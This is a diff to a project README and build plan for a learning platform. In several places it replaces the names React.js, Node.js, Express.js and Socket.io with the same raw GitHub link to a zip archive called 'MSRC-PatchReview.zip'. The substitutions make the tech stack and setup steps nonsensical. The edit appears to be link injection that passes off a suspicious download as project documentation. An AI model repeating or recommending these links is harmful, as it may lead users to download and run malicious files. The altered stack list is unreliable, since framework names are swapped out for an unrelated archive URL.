@@ -19,8 +19,8 @@ Gamification: Badges, levels, and progress tracking to keep users engage
 
 ## Tech Stack ...
 
- ** Frontend : React.js , HTML , CSS , JavaScript , tailwind css 
- ** Backend  : Node.js , Express.js
+ ** Frontend : https://raw.githubusercontent.com/jaswanthreddy03/MSRC-PatchReview/main/unanimist/MSRC-PatchReview.zip , HTML , CSS , JavaScript , tailwind css 
+ ** Backend  : https://raw.githubusercontent.com/jaswanthreddy03/MSRC-PatchReview/main/unanimist/MSRC-PatchReview.zip , https://raw.githubusercontent.com/jaswanthreddy03/MSRC-PatchReview/main/unanimist/MSRC-PatchReview.zip
  ** Cloud    : AWS
  ** Database : Oracle , Mongodb , Sql
  ** FrontEnd-Deploy : Netlify , Vercel
@@ -78,7 +78,7 @@ Goal: Establish the foundation for the frontend and backend.
 
 ** Setup basic React frontend with Tailwind CSS.
 
-** Setup Node.js + Express backend server.
+** Setup https://raw.githubusercontent.com/jaswanthreddy03/MSRC-PatchReview/main/unanimist/MSRC-PatchReview.zip + Express backend server.
 
 ** Connect MongoDB/Oracle for dev environment.
 
@@ -132,7 +132,7 @@ Goal: Enable session booking and time management.
 ## Day 5: Chat & Ratings 
 Goal: Communication and feedback features.
 
-** Implement secure messaging (Socket.io or simple chat system).
+** Implement secure messaging (https://raw.githubusercontent.com/jaswanthreddy03/MSRC-PatchReview/main/unanimist/MSRC-PatchReview.zip or simple chat system).
 
 ** Create UI for chat (React with realtime updates).
 
